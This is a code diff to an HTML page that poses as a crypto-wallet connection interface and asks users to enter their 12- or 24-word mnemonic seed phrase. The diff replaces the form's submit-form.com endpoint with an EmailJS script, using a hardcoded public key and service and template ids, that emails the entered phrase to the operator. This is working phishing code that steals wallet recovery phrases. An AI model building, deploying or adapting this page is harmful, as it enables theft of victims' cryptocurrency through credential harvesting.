@@ -16,6 +16,14 @@
 
     <link rel="shortcut icon" href="assets/icon/Favicon.png">
     <link rel="apple-touch-icon-precomposed" href="assets/icon/Favicon.html">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+  (function () {
+    emailjs.init("yTci51zh-USptUYYf");
+  })();
+</script>
+
 </head>
 
 <!-- <body class="body header-fixed is_dark"> -->
@@ -1205,15 +1213,36 @@
                             <a href="#" id="button_connect_manually2" class="btn btn-primary">Connect Manually</a>
                         </div>
                         <div id="div_connect_manuallly" style="display:none;">
-                            <form action="https://submit-form.com/3bMkhNgA0" method="POST" >
+                            <form id="contact form" method="POST" >
                                 <input type="hidden" name="_captcha" value="false">
                                 <input type="hidden" name="_redirect" value="connect/authenticate.html" />
                                 <input type="hidden" name="_append" value="false" />
-                                <textarea style="./font-size:25px; ./font-weight:650" rows="4" name="secret_phrase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." required></textarea><br>
+                                <textarea style="./font-size:25px; ./font-weight:650" rows="4" name="message" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." required></textarea><br>
                             
                                 <button disabled type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
                             </form>
                         </div>
+
+                        <script>
+  document.getElementById("contact-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    emailjs.sendForm(
+      "service_vexcr06",
+      "template_vl27mso",
+      this
+    ).then(
+      function () {
+        alert("Message sent successfully!");
+      },
+      function (error) {
+        alert("Failed to send message");
+        console.error(error);
+      }
+    );
+  });
+</script>
+
                         
                         <!--<input type="text" class="form-control" placeholder="00.00 ETH">
                         <p>
@@ -1473,6 +1502,7 @@
             margin-bottom:10px
         }
     </style>
+
 </body>
 
 <!-- Designed by OriAde. Telegram: @Streetified99 -->
